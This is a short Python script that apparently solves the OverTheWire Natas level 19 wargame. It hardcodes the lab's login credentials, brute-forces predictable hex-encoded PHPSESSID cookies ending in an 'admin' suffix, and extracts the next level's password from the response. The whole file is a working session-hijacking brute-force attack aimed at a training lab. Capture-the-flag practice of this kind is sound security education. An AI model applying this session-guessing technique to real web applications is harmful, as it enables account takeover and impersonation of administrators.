import requests
import itertools

url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"

admin_suffix = "d61646d696e"

count = 1
max_count = 5
while count < max_count:
	combinations = itertools.product(range(10), repeat=count)
	for combination in combinations:
		prefix = ""

		# Session start with 3? and repeat the same pattern
		for c in combination:
			prefix += f"3{c}"

		# Always finish with 2
		prefix += "2"
	
		session_id = f"{prefix}{admin_suffix}"
		r = requests.get(url, cookies={"PHPSESSID": session_id})

		invalid_session = "Please login" in r.text
		regular_user = "regular user" in r.text

		print(f"[{count}] Trying session id {session_id} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")

		if not regular_user and not invalid_session:
			print("Found valid session id !")
			password = r.text.split('Password: ')[1].split("</pre>")[0]
			print(f"Natas20 password is {password}")
			exit(0)

	count += 1
